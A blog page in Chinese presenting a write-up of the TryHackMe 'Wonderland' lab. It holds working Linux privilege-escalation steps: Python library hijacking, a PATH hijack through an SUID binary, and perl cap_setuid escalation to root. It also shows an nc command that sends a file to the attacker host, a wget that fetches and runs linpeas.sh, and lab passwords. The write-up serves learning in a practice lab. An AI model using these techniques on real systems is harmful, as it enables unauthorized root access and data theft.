@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
+    <meta name="description" content="Try Hack-Wonderland" />
+    <meta name="hexo-theme-A4" content="v1.8.2" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>v2ish1yan</title>
+
+    
+        
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+    
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md>table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md>table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">v2ish1yan</a> 
+            <span class="description">一切都是兴趣使然</span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            Try Hack-Wonderland
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00"><span class="post-toc-text">0x00</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ssh%E8%BF%9E%E6%8E%A5"><span class="post-toc-text">ssh连接</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%8F%90%E6%9D%83%E8%87%B3rabbit"><span class="post-toc-text">提权至rabbit</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%8F%90%E6%9D%83%E8%87%B3hatter"><span class="post-toc-text">提权至hatter</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%8F%90%E6%9D%83%E8%87%B3root"><span class="post-toc-text">提权至root</span></a></li></ol>
+            
+        
+        <h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>可以学到很多提权的方式</p>
+<p>参考链接:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">通过 Python 库劫持进行权限提升</a></li>
+<li><a target="_blank" rel="noopener" href="http://attack.mitre.org/techniques/T1574/007/">PATH环境变量拦截路径</a>虽然说的是windows，但是linux也是同理的</li>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities">capabilities</a></li>
+<li><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/perl/#capabilities">使用perl进行提权</a></li>
+<li><a target="_blank" rel="noopener" href="https://anilcelik.medium.com/en-tryhackme-wonderland-write-up-5443da058acc">优秀的wp</a></li>
+</ul>
+<h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><p>先nmap扫一下端口，发现开启了22端口</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301102013377.png" alt="image-20230110201300334"></p>
+<p>网站的标题是Follow the White Rabbit.</p>
+<p>再结合使用dirbuster扫到了&#x2F;r&#x2F;a,猜测是访问&#x2F;r&#x2F;a&#x2F;b&#x2F;b&#x2F;i&#x2F;t</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301101954574.png" alt="image-20230110195402386"></p>
+<p>然后到了这个页面</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301101956175.png" alt="image-20230110195627049"></p>
+<p>查看源码得到</p>
+<pre><code>alice:HowDothTheLittleCrocodileImproveHisShiningTail
+</code></pre>
+<p>看起来是ssh登录的账户和密码</p>
+<p>使用命令</p>
+<pre><code class="bash">ssh alice@10.10.197.160
+</code></pre>
+<p>来使用ssh连接</p>
+<p>然后发现这个用户的权限非常低，所以要提权</p>
+<h2 id="提权至rabbit"><a href="#提权至rabbit" class="headerlink" title="提权至rabbit"></a>提权至rabbit</h2><p>使用<code>sudo -l</code>查看当前用户可执行与无法执行的指令,发现可以使用rabbit的权限去运行python3和walrus_and_the_carpenter.py文件</p>
+<pre><code class="bash">Matching Defaults entries for alice on wonderland:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alice may run the following commands on wonderland:
+    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+</code></pre>
+<p>然后再看看walrus_and_the_carpenter.py</p>
+<pre><code class="python">import random
+poem = &quot;&quot;&quot;The sun was shining on the sea,
+Shining with all his might:
+................
+&quot;&quot;&quot;
+
+for i in range(10):
+    line = random.choice(poem.split(&quot;\n&quot;))
+    print(&quot;The line was:\t&quot;, line)
+</code></pre>
+<p>他导入了一个random库，然后设置了一个变量poem，让他随机打印十行诗句</p>
+<p>这里的关键就是<strong>通过劫持Python库进行权限提升</strong></p>
+<p>python在导入库的时候，有一个库的搜索路径列表，使用下面的命令可以输出搜索顺序</p>
+<pre><code class="bash">python3 -c &#39;import sys;print (sys.path)&#39;
+</code></pre>
+<pre><code class="bash">[&#39;&#39;, &#39;/usr/lib/python36.zip&#39;, &#39;/usr/lib/python3.6&#39;, &#39;/usr/lib/python3.6/lib-dynload&#39;, &#39;/usr/local/lib/python3.6/dist-packages&#39;, &#39;/usr/lib/python3/dist-packages&#39;]
+</code></pre>
+<p>最前面的表示当前目录，即和执行的py脚本在同一个目录</p>
+<p>我们只要把自己写的random.py文件放在原本的random.py前面，从而劫持库来进行提权</p>
+<p>在&#x2F;usr&#x2F;lib&#x2F;python3.6目录下可以找到random.py，所以我们在walrus_and_the_carpenter.py的同一目录下创建一个random.py，这样在导入random库的时候就会先导入我们写的random.py，从而来提升到rabbit权限</p>
+<p><code>/home/alice/</code>我们是有权限写入的</p>
+<p><code>random.py</code></p>
+<pre><code class="python">import os
+os.system(&quot;/bin/bash&quot;)
+</code></pre>
+<p>然后用rabbit用户运行这个脚本</p>
+<pre><code class="bash">sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+</code></pre>
+<p>就可以发现，已经切换到rabbit用户了</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301102122828.png" alt="image-20230110212238778"></p>
+<p>user.txt是看提示，说一切都是颠倒的，所以user.txt在&#x2F;root里被找到</p>
+<p>&#x2F;root&#x2F;里不能使用ls，所以只能直接猜</p>
+<pre><code class="bash">cat /root/user.txt
+</code></pre>
+<h2 id="提权至hatter"><a href="#提权至hatter" class="headerlink" title="提权至hatter"></a>提权至hatter</h2><p>然后还得提权</p>
+<p>在&#x2F;home&#x2F;rabbit目录发现了存在suid位的可执行文件teaParty</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301102142211.png" alt="image-20230110213944067"></p>
+<p>有suid位，说明其他用户在执行这个程序的时候，将获取文件所有者的权限以及所有者的UID和GID，可以进行提权</p>
+<p>可以查看一下这个可执行文件，使用nc来将文件下载下来</p>
+<p>目标机</p>
+<pre><code class="bash">nc 10.18.104.32 9000 &lt; teaParty 
+</code></pre>
+<p>攻击机</p>
+<pre><code class="bash">nc -lvvp 9000 &gt; teaParty
+</code></pre>
+<p>使用ida查看，得到伪代码</p>
+<pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
+&#123;
+  setuid(0x3EBu);
+  setgid(0x3EBu);
+  puts(&quot;Welcome to the tea party!\nThe Mad Hatter will be here soon.&quot;);
+  system(&quot;/bin/echo -n &#39;Probably by &#39; &amp;&amp; date --date=&#39;next hour&#39; -R&quot;);
+  puts(&quot;Ask very nicely, and I will give you some tea while you wait for him&quot;);
+  getchar();
+  return puts(&quot;Segmentation fault (core dumped)&quot;);
+&#125;
+</code></pre>
+<p>发现他会执行<code>echo</code>和<code>date</code>两个系统命令，echo是直接执行的文件，而data是通过系统变量来定位的文件</p>
+<p>使用命令<code>echo $PATH</code>查看目标主机的系统变量，为</p>
+<pre><code class="bash">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+</code></pre>
+<p>使用<code>which date</code>可以知道这个命令的绝对路径，为</p>
+<pre><code class="bash">/bin/date
+</code></pre>
+<p>我们可以找一个有权限写入的目录，构造一个可执行脚本，并命名为date。然后修改PATH的值将这个伪造的可执行文件date的目录放在最前面。</p>
+<p>这样在执行teaParty的时候，他就会以root的权限执行这个文件，然后在执行date的时候就会执行到我们构造的那个恶意文件</p>
+<p>查找发现&#x2F;tmp可以写入</p>
+<p><code>date</code></p>
+<pre><code class="bash">#!/bin/bash
+/bin/bash
+</code></pre>
+<p>然后执行命令</p>
+<pre><code class="bash">chmod +x date
+export PATH=/tmp:$PATH
+</code></pre>
+<p>查看PATH，<code>echo $PATH</code>，已经生效</p>
+<pre><code class="bash">/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+</code></pre>
+<p>然后执行teaParty,成功提权为hatter用户</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301102210850.png" alt="image-20230110221048792"></p>
+<p>在&#x2F;home&#x2F;hatter可以发现password.txt文件</p>
+<pre><code>WhyIsARavenLikeAWritingDesk?
+</code></pre>
+<p>猜测可能是root的密码,发现不是。</p>
+<p>尝试tryhackme用户，也不是。</p>
+<p>最后发现就是hatter用户的密码。</p>
+<p>执行<code>sudo -l</code>后，发现没有什么可以使用sudo执行的命令</p>
+<h2 id="提权至root"><a href="#提权至root" class="headerlink" title="提权至root"></a>提权至root</h2><p>可以使用<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a>来查找可能存在的提权方式</p>
+<p>在攻击机上开启pytho服务，目标机使用wget下载文件</p>
+<pre><code class="bash">python3 -m http.server
+</code></pre>
+<pre><code class="bash">wget http://10.18.104.3x:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh -a
+</code></pre>
+<p>在capability中可以发现以下内容</p>
+<pre><code class="bash">Files with capabilities (limited to 50):
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities">Capability</a>是linux将root权限进行分割然后分配给其他进程，使其他进程可以在普通用户权限下让程序拥有额外的权限</p>
+<p>为了让Capability的概念更透彻，我们可以举下面的例子：假设有一个web服务器运行在80端口，我们需要额外的root权限来扫描1024端口之前的端口。在这一点上，而不是给full root 权限给低权限用户，我们可以设置capability给二进制文件来执行所需的操作。</p>
+<p>这里perl拥有一些capability，在<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/perl/#capabilities">gtfobins</a>上找使用perl进行提权的相关命令</p>
+<p>执行以下命令，得到root权限</p>
+<pre><code class="bash">/usr/bin/perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#39;
+</code></pre>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301102249943.png" alt="image-20230110224918893"></p>
+<p>然后就可以去&#x2F;home&#x2F;alice&#x2F;读取root.txt了 XD</p>
+
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2023-07-03</span>
+            
+                <span>该篇文章被 v2ish1yan</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/Linux%E6%8F%90%E6%9D%83/'>
+                            Linux提权
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/Tryhackme/'>
+                            Tryhackme
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+   
+    
+<script src="/js/highlight.min.js"></script>
+
+    
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
